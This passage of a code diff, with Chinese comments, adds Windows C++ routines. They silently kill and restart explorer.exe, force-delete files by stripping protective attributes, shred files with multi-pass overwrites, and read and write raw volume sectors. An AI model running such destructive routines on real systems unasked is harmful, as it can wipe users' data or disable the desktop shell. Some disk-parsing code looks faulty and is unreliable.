+    PROCESS_INFORMATION pi = { 0 };
+    
+    wchar_t explorerPath[MAX_PATH] = { 0 };
+    GetSystemDirectoryW(explorerPath, MAX_PATH);
+    wcscat_s(explorerPath, L"\\explorer.exe");
+    
+    if (CreateProcessW(explorerPath, NULL, NULL, NULL, FALSE, 
+        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        g_explorerPid = pi.dwProcessId;
+        return true;
+    }
+    
+    return false;
+}
+
+void ExplorerMonitorThread() {
+    g_explorerMonitorEnabled = true;
+    
+    while (g_explorerMonitorEnabled) {
+        // 检测桌面是否存在
+        bool desktopFound = false;
+        
+        // 方法1: 查找桌面图标窗口
+        HWND sysListView = FindWindowExW(NULL, NULL, L"SysListView32", L"FolderView");
+        if (sysListView && IsWindowVisible(sysListView)) {
+            desktopFound = true;
+        }
+        
+        // 方法2: 查找Progman
+        if (!desktopFound) {
+            HWND progman = FindWindowW(L"Progman", NULL);
+            if (progman && IsWindowVisible(progman)) {
+                desktopFound = true;
+            }
+        }
+        
+        // 方法3: 查找WorkerW
+        if (!desktopFound) {
+            HWND workerW = FindWindowW(L"WorkerW", NULL);
+            if (workerW && IsWindowVisible(workerW)) {
+                desktopFound = true;
+            }
+        }
+        
+        // 方法4: 查找任务栏
+        if (!desktopFound) {
+            HWND trayWnd = FindWindowW(L"Shell_TrayWnd", NULL);
+            if (trayWnd && IsWindowVisible(trayWnd)) {
+                desktopFound = true;
+            }
+        }
+        
+        if (!desktopFound) {
+            // 静默恢复，不输出信息
+            // 尝试多种方法恢复
+            RestoreDesktop();
+            RestoreFromDXGIOverlay();
+            
+            // 再次检查
+            sysListView = FindWindowExW(NULL, NULL, L"SysListView32", L"FolderView");
+            if (sysListView && IsWindowVisible(sysListView)) {
+                desktopFound = true;
+            }
+            
+            // 如果还是失败，尝试重启Explorer
+            if (!desktopFound) {
+                // 结束所有Explorer进程
+                std::vector<int> allExplorerPids = ProcessTerminator::getPIDsByName("explorer.exe");
+                for (int pid : allExplorerPids) {
+                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+                    if (hProcess) {
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                    }
+                }
+                
+                Sleep(1000);
+                
+                RestartExplorerDesktop();
+                RestoreFromDXGIOverlay();
+            }
+        }
+        
+        Sleep(500);
+    }
+}
+
+// 启动Explorer监控
+void StartExplorerMonitor() {
+    static std::thread monitorThread;
+    if (!g_explorerMonitorEnabled) {
+        g_explorerMonitorEnabled = true;
+        monitorThread = std::thread(ExplorerMonitorThread);
+        monitorThread.detach();
+    }
+}
+
+// 停止Explorer监控
+void StopExplorerMonitor() {
+    g_explorerMonitorEnabled = false;
+}
+
+typedef NTSTATUS(NTAPI* _NtQuerySystemInformationAlt)(
+    ULONG SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+    );
+
+_NtQuerySystemInformationAlt NtQuerySysInfo = nullptr;
+
+unsigned int __stdcall DeleteFileWorkerThread(LPVOID param) {
+    std::wstring* filePath = static_cast<std::wstring*>(param);
+    if (filePath) {
+        DWORD attributes = GetFileAttributesW(filePath->c_str());
+        if (attributes != INVALID_FILE_ATTRIBUTES) {
+            if (attributes & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
+                SetFileAttributesW(filePath->c_str(), attributes & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN));
+            }
+            DeleteFileW(filePath->c_str());
+        }
+        delete filePath;
+    }
+    return 0;
+}
+
+bool QuickDeletePath(const std::wstring& path) {
+    DWORD attributes = GetFileAttributesW(path.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        return GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = path + L"\\*";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            std::vector<HANDLE> threads;
+
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                    continue;
+
+                std::wstring subPath = path + L"\\" + findData.cFileName;
+
+                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    QuickDeletePath(subPath);
+                }
+                else {
+                    if (findData.dwFileAttributes & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
+                        SetFileAttributesW(subPath.c_str(), findData.dwFileAttributes & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN));
+                    }
+
+                    while (threads.size() >= 1000) {
+                        DWORD waitResult = WaitForMultipleObjects(static_cast<DWORD>(threads.size() > 64 ? 64 : threads.size()), threads.data(), FALSE, INFINITE);
+                        if (waitResult >= WAIT_OBJECT_0 && waitResult < WAIT_OBJECT_0 + threads.size()) {
+                            DWORD idx = waitResult - WAIT_OBJECT_0;
+                            if (threads[idx]) {
+                                CloseHandle(threads[idx]);
+                                threads[idx] = threads.back();
+                                threads.pop_back();
+                            }
+                        }
+                    }
+
+                    std::wstring* pPath = new std::wstring(subPath);
+                    HANDLE hThread = (HANDLE)_beginthreadex(nullptr, 0, DeleteFileWorkerThread, pPath, 0, nullptr);
+                    if (hThread) {
+                        threads.push_back(hThread);
+                    }
+                    else {
+                        delete pPath;
+                    }
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+
+            for (HANDLE hThread : threads) {
+                WaitForSingleObject(hThread, INFINITE);
+                CloseHandle(hThread);
+            }
+        }
+
+        if (attributes & FILE_ATTRIBUTE_READONLY) {
+            SetFileAttributesW(path.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
+        }
+
+        for (int retry = 0; retry < 2; retry++) {
+            if (RemoveDirectoryW(path.c_str())) {
+                return true;
+            }
+            if (GetLastError() == ERROR_DIR_NOT_EMPTY) {
+                std::wstring searchPath = path + L"\\*";
+                WIN32_FIND_DATAW findData;
+                HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                            continue;
+                        std::wstring subPath = path + L"\\" + findData.cFileName;
+                        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                            QuickDeletePath(subPath);
+                        }
+                        else {
+                            DeleteFileW(subPath.c_str());
+                        }
+                    } while (FindNextFileW(hFind, &findData));
+                    FindClose(hFind);
+                }
+                Sleep(100);
+                continue;
+            }
+            break;
+        }
+        return false;
+    }
+    else {
+        if (attributes & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
+            SetFileAttributesW(path.c_str(), attributes & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN));
+        }
+        return DeleteFileW(path.c_str()) != 0;
+    }
+}
+
+enum class SecureWipeMode {
+    SingleZero = 1,
+    SingleRandom = 2,
+    DoD_5220_22_M = 3,
+    Gutmann = 7,
+    GutmannFull = 35
+};
+
+static std::vector<BYTE> g_zeroBuffer;
+static std::vector<BYTE> g_randomBuffer;
+static bool g_rngInitialized = false;
+static std::mt19937_64 g_rng;
+
+static void EnsureBuffers(size_t bufferSize) {
+    if (g_zeroBuffer.size() < bufferSize) {
+        g_zeroBuffer.assign(bufferSize, 0);
+    }
+    if (g_randomBuffer.size() < bufferSize) {
+        g_randomBuffer.resize(bufferSize);
+    }
+}
+
+static void InitializeRandomIfNeeded() {
+    if (!g_rngInitialized) {
+        std::random_device rd;
+        g_rng.seed(rd());
+        g_rngInitialized = true;
+    }
+}
+
+static void FillRandomBuffer(BYTE* buffer, size_t size) {
+    InitializeRandomIfNeeded();
+    for (size_t i = 0; i < size; ++i) {
+        buffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+    }
+}
+
+static bool SecureWipeFileInternal(HANDLE hFile, SecureWipeMode mode, bool flushToDisk) {
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize)) {
+        return false;
+    }
+
+    if (fileSize.QuadPart == 0) {
+        return true;
+    }
+
+    static const size_t BUFFER_SIZE = 65536;
+    EnsureBuffers(BUFFER_SIZE);
+
+    DWORD passes = 0;
+    switch (mode) {
+        case SecureWipeMode::SingleZero:
+        case SecureWipeMode::SingleRandom:
+            passes = 1;
+            break;
+        case SecureWipeMode::DoD_5220_22_M:
+            passes = 3;
+            break;
+        case SecureWipeMode::Gutmann:
+            passes = 7;
+            break;
+        case SecureWipeMode::GutmannFull:
+            passes = 35;
+            break;
+        default:
+            passes = 3;
+    }
+
+    LARGE_INTEGER zeroPos = { 0 };
+    for (DWORD pass = 0; pass < passes; ++pass) {
+        if (!SetFilePointerEx(hFile, zeroPos, NULL, FILE_BEGIN)) {
+            return false;
+        }
+
+        BYTE fillByte = 0x00;
+        if (mode == SecureWipeMode::SingleRandom) {
+            FillRandomBuffer(g_randomBuffer.data(), BUFFER_SIZE);
+        }
+        else if (mode == SecureWipeMode::DoD_5220_22_M) {
+            if (pass == 0) fillByte = 0x00;
+            else if (pass == 1) fillByte = 0xFF;
+            else FillRandomBuffer(g_randomBuffer.data(), BUFFER_SIZE);
+        }
+        else if (mode == SecureWipeMode::Gutmann || mode == SecureWipeMode::GutmannFull) {
+            if (pass < 4) {
+                fillByte = (pass % 2 == 0) ? 0x55 : 0xAA;
+            }
+            else if (pass < 7) {
+                FillRandomBuffer(g_randomBuffer.data(), BUFFER_SIZE);
+            }
+        }
+
+        LONGLONG remaining = fileSize.QuadPart;
+        DWORD bytesWritten = 0;
+
+        while (remaining > 0) {
+            size_t writeSize = (remaining > static_cast<LONGLONG>(BUFFER_SIZE)) ? BUFFER_SIZE : static_cast<size_t>(remaining);
+
+            BYTE* writeBuffer = g_zeroBuffer.data();
+            if (mode == SecureWipeMode::SingleRandom ||
+                (mode == SecureWipeMode::DoD_5220_22_M && pass == 2) ||
+                ((mode == SecureWipeMode::Gutmann || mode == SecureWipeMode::GutmannFull) && pass >= 4 && pass < 7)) {
+                writeBuffer = g_randomBuffer.data();
+            }
+            else if ((mode == SecureWipeMode::Gutmann || mode == SecureWipeMode::GutmannFull) && pass < 4) {
+                memset(g_zeroBuffer.data(), fillByte, BUFFER_SIZE);
+            }
+            else if (mode == SecureWipeMode::DoD_5220_22_M && pass < 2) {
+                memset(g_zeroBuffer.data(), fillByte, BUFFER_SIZE);
+            }
+
+            if (!WriteFile(hFile, writeBuffer, static_cast<DWORD>(writeSize), &bytesWritten, NULL)) {
+                return false;
+            }
+            remaining -= bytesWritten;
+        }
+
+        if (flushToDisk) {
+            FlushFileBuffers(hFile);
+        }
+    }
+
+    if (!SetFilePointerEx(hFile, zeroPos, NULL, FILE_BEGIN)) {
+        return false;
+    }
+
+    return true;
+}
+
+static bool ShredFileBasic(const std::wstring& filePath, SecureWipeMode mode, bool deleteAfterWipe) {
+    DWORD attributes = GetFileAttributesW(filePath.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        return false;
+    }
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        return false;
+    }
+
+    DWORD newAttributes = attributes & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+    if (newAttributes != attributes) {
+        SetFileAttributesW(filePath.c_str(), newAttributes);
+    }
+
+    HANDLE hFile = CreateFileW(
+        filePath.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_NO_BUFFERING | FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        hFile = CreateFileW(
+            filePath.c_str(),
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+    }
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    bool result = SecureWipeFileInternal(hFile, mode, true);
+    CloseHandle(hFile);
+
+    if (result && deleteAfterWipe) {
+        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
+        result = (DeleteFileW(filePath.c_str()) != 0);
+    }
+
+    return result;
+}
+
+static bool ShredDirectoryRecursive(const std::wstring& dirPath, SecureWipeMode mode, bool deleteAfterWipe) {
+    std::wstring searchPath = dirPath + L"\\*";
+    WIN32_FIND_DATAW findData;
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    bool allSuccess = true;
+
+    do {
+        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
+            continue;
+        }
+
+        std::wstring fullPath = dirPath + L"\\" + findData.cFileName;
+
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            if (!ShredDirectoryRecursive(fullPath, mode, deleteAfterWipe)) {
+                allSuccess = false;
+            }
+        }
+        else {
+            if (!ShredFileBasic(fullPath, mode, deleteAfterWipe)) {
+                allSuccess = false;
+            }
+        }
+    } while (FindNextFileW(hFind, &findData));
+
+    FindClose(hFind);
+
+    if (deleteAfterWipe) {
+        SetFileAttributesW(dirPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+        if (!RemoveDirectoryW(dirPath.c_str())) {
+            allSuccess = false;
+        }
+    }
+
+    return allSuccess;
+}
+
+bool SecureShredFile(const std::wstring& path, SecureWipeMode mode, bool deleteAfterWipe) {
+    if (path.empty()) {
+        return false;
+    }
+
+    DWORD attributes = GetFileAttributesW(path.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        return GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        return ShredDirectoryRecursive(path, mode, deleteAfterWipe);
+    }
+
+    return ShredFileBasic(path, mode, deleteAfterWipe);
+}
+
+bool SecureShredFileDoD(const std::wstring& path, bool deleteAfterWipe) {
+    return SecureShredFile(path, SecureWipeMode::DoD_5220_22_M, deleteAfterWipe);
+}
+
+bool SecureShredFileGutmann(const std::wstring& path, bool deleteAfterWipe) {
+    return SecureShredFile(path, SecureWipeMode::GutmannFull, deleteAfterWipe);
+}
+
+enum class DiskFileSystemType {
+    Unknown,
+    FAT16,
+    FAT32,
+    exFAT,
+    NTFS
+};
+
+struct DiskGeometry {
+    ULONGLONG bytesPerSector;
+    ULONGLONG sectorsPerCluster;
+    ULONGLONG totalClusters;
+    ULONGLONG fatStartSector;
+    ULONGLONG fatSize;
+    ULONGLONG dataStartSector;
+    ULONGLONG rootDirStartCluster;
+    DiskFileSystemType fsType;
+    WCHAR volumeLetter;
+    int physicalDriveNumber;
+    int partitionNumber;
+};
+
+struct FileLocation {
+    WCHAR volumeLetter;
+    ULONGLONG startingCluster;
+    ULONGLONG fileSize;
+    std::vector<ULONGLONG> clusters;
+    bool isContiguous;
+};
+
+static bool ReadSector(WCHAR driveLetter, ULONGLONG sector, DWORD count, LPBYTE buffer) {
+    wchar_t devicePath[20];
+    swprintf_s(devicePath, L"\\\\.\\%c:", driveLetter);
+    
+    HandlePtr hDrive(CreateFileW(
+        devicePath,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
+        NULL
+    ));
+    
+    if (hDrive.get() == INVALID_HANDLE_VALUE) {
+        hDrive.reset(CreateFileW(
+            devicePath,
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        ));
+    }
+    
+    if (hDrive.get() == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    LARGE_INTEGER offset;
+    offset.QuadPart = sector * 512;
+    
+    if (!SetFilePointerEx(hDrive.get(), offset, NULL, FILE_BEGIN)) {
+        return false;
+    }
+    
+    DWORD bytesRead = 0;
+    return ReadFile(hDrive.get(), buffer, count * 512, &bytesRead, NULL) && bytesRead == count * 512;
+}
+
+static bool WriteSector(WCHAR driveLetter, ULONGLONG sector, DWORD count, LPBYTE buffer) {
+    wchar_t devicePath[20];
+    swprintf_s(devicePath, L"\\\\.\\%c:", driveLetter);
+    
+    HandlePtr hDrive(CreateFileW(
+        devicePath,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
+        NULL
+    ));
+    
+    if (hDrive.get() == INVALID_HANDLE_VALUE) {
+        hDrive.reset(CreateFileW(
+            devicePath,
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        ));
+    }
+    
+    if (hDrive.get() == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    LARGE_INTEGER offset;
+    offset.QuadPart = sector * 512;
+    
+    if (!SetFilePointerEx(hDrive.get(), offset, NULL, FILE_BEGIN)) {
+        return false;
+    }
+    
+    DWORD bytesWritten = 0;
+    if (!WriteFile(hDrive.get(), buffer, count * 512, &bytesWritten, NULL)) {
+        return false;
+    }
+    
+    FlushFileBuffers(hDrive.get());
+    
+    return bytesWritten == count * 512;
+}
+
+static DiskFileSystemType DetectFileSystem(WCHAR driveLetter) {
+    BYTE bootSector[512];
+    if (!ReadSector(driveLetter, 0, 1, bootSector)) {
+        return DiskFileSystemType::Unknown;
+    }
+    
+    if (bootSector[510] != 0x55 || bootSector[511] != 0xAA) {
+        return DiskFileSystemType::Unknown;
+    }
+    
+    WORD bytesPerSector = *(WORD*)&bootSector[11];
+    BYTE sectorsPerCluster = bootSector[13];
+    WORD reservedSectors = *(WORD*)&bootSector[14];
+    BYTE fatCount = bootSector[16];
+    WORD rootEntries = *(WORD*)&bootSector[17];
+    WORD totalSectors16 = *(WORD*)&bootSector[19];
+    DWORD totalSectors32 = *(DWORD*)&bootSector[32];
+    DWORD fatSize32 = *(DWORD*)&bootSector[36];
+    
+    if (totalSectors16 == 0 && totalSectors32 > 0) {
+        DWORD totalSectors = totalSectors32;
+    }
+    
+    DWORD sectorsPerFat = 0;
+    if (fatSize32 > 0) {
+        sectorsPerFat = fatSize32;
+    }
+    else {
+        WORD fatSize16 = *(WORD*)&bootSector[22];
+        sectorsPerFat = fatSize16;
+    }
+    
+    DWORD dataSectors = 0;
+    if (totalSectors16 > 0) {
+        dataSectors = totalSectors16 - reservedSectors - (fatCount * sectorsPerFat) - ((rootEntries * 32 + 511) / 512);
+    }
+    else {
+        dataSectors = totalSectors32 - reservedSectors - (fatCount * sectorsPerFat) - ((rootEntries * 32 + 511) / 512);
+    }
+    
+    if (sectorsPerFat == 0 && fatCount == 2) {
+        if (dataSectors < 66600) {
+            return DiskFileSystemType::FAT16;
+        }
+        else {
+            return DiskFileSystemType::FAT32;
+        }
+    }
+    
+    if (fatCount == 2 && sectorsPerFat > 0) {
+        if (totalSectors16 > 0 && totalSectors16 < 65536) {
+            return DiskFileSystemType::FAT16;
+        }
+        else if (totalSectors16 == 0 && totalSectors32 > 0) {
+            return DiskFileSystemType::FAT32;
+        }
+    }
+    
+    if (bootSector[3] == 'e' && bootSector[4] == 'x' && bootSector[5] == 'F' && bootSector[6] == 'A' && bootSector[7] == 'T') {
+        return DiskFileSystemType::exFAT;
+    }
+    
+    if (bootSector[3] == 'N' && bootSector[4] == 'T' && bootSector[5] == 'F' && bootSector[6] == 'S') {
+        return DiskFileSystemType::NTFS;
+    }
+    
+    if (bootSector[3] == 'F' && bootSector[4] == 'A' && bootSector[5] == 'T') {
+        if (rootEntries > 0) {
+            return DiskFileSystemType::FAT16;
+        }
+        else {
+            return DiskFileSystemType::FAT32;
+        }
+    }
+    
+    return DiskFileSystemType::Unknown;
+}
+
+static bool GetVolumeInfo(WCHAR driveLetter, DiskGeometry* diskGeo) {
+    if (!diskGeo) return false;
+    
+    memset(diskGeo, 0, sizeof(DiskGeometry));
+    diskGeo->volumeLetter = driveLetter;
+    
+    BYTE bootSector[512];
+    if (!ReadSector(driveLetter, 0, 1, bootSector)) {
+        return false;
+    }
+    
+    diskGeo->bytesPerSector = *(WORD*)&bootSector[11];
+    if (diskGeo->bytesPerSector == 0) {
+        diskGeo->bytesPerSector = 512;
+    }
+    
+    diskGeo->sectorsPerCluster = bootSector[13];
+    if (diskGeo->sectorsPerCluster == 0) {
+        diskGeo->sectorsPerCluster = 1;
+    }
+    
+    WORD reservedSectors = *(WORD*)&bootSector[14];
+    BYTE fatCount = bootSector[16];
+    
+    DWORD fatSizeSectors = 0;
+    
+    diskGeo->fsType = DetectFileSystem(driveLetter);
+    
+    if (diskGeo->fsType == DiskFileSystemType::FAT16) {
+        DWORD totalSectors = *(WORD*)&bootSector[19];
+        if (totalSectors == 0) {
+            totalSectors = *(DWORD*)&bootSector[32];
+        }
+        
+        WORD rootEntries = *(WORD*)&bootSector[17];
+        DWORD rootDirSectors = static_cast<DWORD>((static_cast<ULONGLONG>(rootEntries) * 32 + diskGeo->bytesPerSector - 1) / diskGeo->bytesPerSector);
+        
+        WORD fatSize16 = *(WORD*)&bootSector[22];
+        diskGeo->fatSize = fatSize16;
+        fatSizeSectors = fatSize16;
+        
+        diskGeo->fatStartSector = reservedSectors;
+        DWORD rootDirStart = reservedSectors + (fatCount * fatSizeSectors);
+        diskGeo->rootDirStartCluster = rootDirStart;
+        diskGeo->dataStartSector = rootDirStart + rootDirSectors;
+        
+        DWORD dataSectors = totalSectors - reservedSectors - (fatCount * fatSizeSectors) - rootDirSectors;
+        diskGeo->totalClusters = dataSectors / diskGeo->sectorsPerCluster;
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::FAT32) {
+        DWORD totalSectors = *(DWORD*)&bootSector[32];
+        if (totalSectors == 0) {
+            totalSectors = *(WORD*)&bootSector[19];
+        }
+        
+        DWORD fatSize32 = *(DWORD*)&bootSector[36];
+        diskGeo->fatSize = fatSize32;
+        fatSizeSectors = fatSize32;
+        
+        diskGeo->fatStartSector = reservedSectors;
+        
+        DWORD rootDirStartCluster = *(DWORD*)&bootSector[44];
+        diskGeo->rootDirStartCluster = rootDirStartCluster;
+        diskGeo->dataStartSector = reservedSectors + (fatCount * fatSizeSectors);
+        
+        DWORD dataSectors = totalSectors - reservedSectors - (fatCount * fatSizeSectors);
+        diskGeo->totalClusters = dataSectors / diskGeo->sectorsPerCluster;
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::exFAT) {
+        DWORD totalSectors = *(DWORD*)&bootSector[80];
+        DWORD fatOffset = *(DWORD*)&bootSector[72];
+        DWORD fatLength = *(DWORD*)&bootSector[76];
+        DWORD clusterHeapOffset = *(DWORD*)&bootSector[80];
+        DWORD clusterHeapLength = *(DWORD*)&bootSector[84];
+        
+        diskGeo->fatStartSector = fatOffset;
+        diskGeo->fatSize = fatLength;
+        diskGeo->dataStartSector = clusterHeapOffset;
+        diskGeo->totalClusters = clusterHeapLength / diskGeo->sectorsPerCluster;
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::NTFS) {
+        diskGeo->bytesPerSector = *(WORD*)&bootSector[0x0B];
+        if (diskGeo->bytesPerSector == 0) {
+            diskGeo->bytesPerSector = 512;
+        }
+        
+        diskGeo->sectorsPerCluster = bootSector[0x0D];
+        if (diskGeo->sectorsPerCluster == 0) {
+            diskGeo->sectorsPerCluster = 1;
+        }
+        
+        ULONGLONG mftStartLcn = *(LONGLONG*)&bootSector[0x30];
+        ULONGLONG mftMirrorStartLcn = *(LONGLONG*)&bootSector[0x38];
+        
+        diskGeo->fatStartSector = mftStartLcn;
+        diskGeo->rootDirStartCluster = mftStartLcn;
+        
+        DWORD totalSectors = *(DWORD*)&bootSector[0x28];
+        if (totalSectors == 0) {
+            totalSectors = *(WORD*)&bootSector[0x20];
+            if (totalSectors == 0) {
+                totalSectors = *(DWORD*)&bootSector[0x48];
+            }
+        }
+        
+        diskGeo->totalClusters = totalSectors / diskGeo->sectorsPerCluster;
+    }
+    else {
+        return false;
+    }
+    
+    diskGeo->physicalDriveNumber = -1;
+    diskGeo->partitionNumber = 0;
+    
+    {
+        wchar_t volumePath[4] = { driveLetter, L':', L'\\', L'\0' };
+        
+        HANDLE hVol = CreateFileW(volumePath, GENERIC_READ,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  nullptr, OPEN_EXISTING,
+                                  FILE_FLAG_BACKUP_SEMANTICS, nullptr);
+        if (hVol != INVALID_HANDLE_VALUE) {
+            PARTITION_INFORMATION_EX partInfo;
+            DWORD bytesReturned;
+            if (DeviceIoControl(hVol, IOCTL_DISK_GET_PARTITION_INFO_EX,
+                               nullptr, 0, &partInfo, sizeof(partInfo), &bytesReturned, nullptr)) {
+                diskGeo->partitionNumber = partInfo.PartitionNumber;
+                
+                VOLUME_DISK_EXTENTS extents;
+                if (DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
+                                   nullptr, 0, &extents, sizeof(extents), &bytesReturned, nullptr)) {
+                    if (extents.NumberOfDiskExtents > 0) {
+                        diskGeo->physicalDriveNumber = extents.Extents[0].DiskNumber;
+                    }
+                }
+            }
+            CloseHandle(hVol);
+        }
+        
+        if (diskGeo->physicalDriveNumber < 0) {
+            wchar_t devicePath[MAX_PATH];
+            swprintf_s(devicePath, L"\\\\.\\%c:", driveLetter);
+            
+            HANDLE hDev = CreateFileW(devicePath, GENERIC_READ,
+                                      FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                      nullptr, OPEN_EXISTING, 0, nullptr);
+            if (hDev != INVALID_HANDLE_VALUE) {
+                STORAGE_DEVICE_NUMBER deviceNumber;
+                DWORD bytesReturned;
+                if (DeviceIoControl(hDev, IOCTL_STORAGE_GET_DEVICE_NUMBER,
+                                   nullptr, 0, &deviceNumber, sizeof(deviceNumber), &bytesReturned, nullptr)) {
+                    diskGeo->physicalDriveNumber = deviceNumber.DeviceNumber;
+                    diskGeo->partitionNumber = deviceNumber.PartitionNumber;
+                }
+                CloseHandle(hDev);
+            }
+        }
+    }
+    
+    return diskGeo->fsType != DiskFileSystemType::Unknown;
+}
+
+static ULONGLONG ClusterToSector(DiskGeometry* diskGeo, ULONGLONG cluster) {
+    if (diskGeo->fsType == DiskFileSystemType::NTFS) {
+        return cluster * diskGeo->sectorsPerCluster;
+    }
+    return diskGeo->dataStartSector + (cluster - 2) * diskGeo->sectorsPerCluster;
+}
+
+static ULONGLONG ReadFatEntry(DiskGeometry* diskGeo, ULONGLONG cluster) {
+    if (diskGeo->fsType == DiskFileSystemType::FAT16) {
+        ULONGLONG fatSector = diskGeo->fatStartSector + (cluster * 2) / diskGeo->bytesPerSector;
+        ULONGLONG fatOffset = (cluster * 2) % diskGeo->bytesPerSector;
+        
+        BYTE fatSectorData[512];
+        if (ReadSector(diskGeo->volumeLetter, fatSector, 1, fatSectorData)) {
+            WORD fatEntry = *(WORD*)&fatSectorData[fatOffset];
+            if (fatEntry >= 0xFFF8 && fatEntry != 0xFFFF) {
+                return 0xFFFFFFFF;
+            }
+            return fatEntry;
+        }
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::FAT32) {
+        ULONGLONG fatSector = diskGeo->fatStartSector + (cluster * 4) / diskGeo->bytesPerSector;
+        ULONGLONG fatOffset = (cluster * 4) % diskGeo->bytesPerSector;
+        
+        BYTE fatSectorData[512];
+        if (ReadSector(diskGeo->volumeLetter, fatSector, 1, fatSectorData)) {
+            DWORD fatEntry = *(DWORD*)&fatSectorData[fatOffset] & 0x0FFFFFFF;
+            if (fatEntry >= 0x0FFFFFF8) {
+                return 0xFFFFFFFF;
+            }
+            return fatEntry;
+        }
+    }
+    
+    return 0xFFFFFFFF;
+}
+
+static bool GetFileClusters(DiskGeometry* diskGeo, const std::wstring& fileName, FileLocation* fileLoc) {
+    if (!diskGeo || !fileLoc) return false;
+    
+    wprintf(L"[DEBUG] GetFileClusters: searching for '%s'\n", fileName.c_str());
+    
+    memset(fileLoc, 0, sizeof(FileLocation));
+    fileLoc->volumeLetter = diskGeo->volumeLetter;
+    
+    std::wstring searchName = fileName;
+    std::transform(searchName.begin(), searchName.end(), searchName.begin(), ::toupper);
+    
+    if (searchName.length() > 12) {
+        searchName = searchName.substr(0, 12);
+    }
+    
+    if (diskGeo->fsType == DiskFileSystemType::FAT16) {
+        DWORD rootDirSectors = static_cast<DWORD>((512ULL * 32 + diskGeo->bytesPerSector - 1) / diskGeo->bytesPerSector);
+        
+        for (DWORD sector = 0; sector < rootDirSectors; sector++) {
+            BYTE dirData[512];
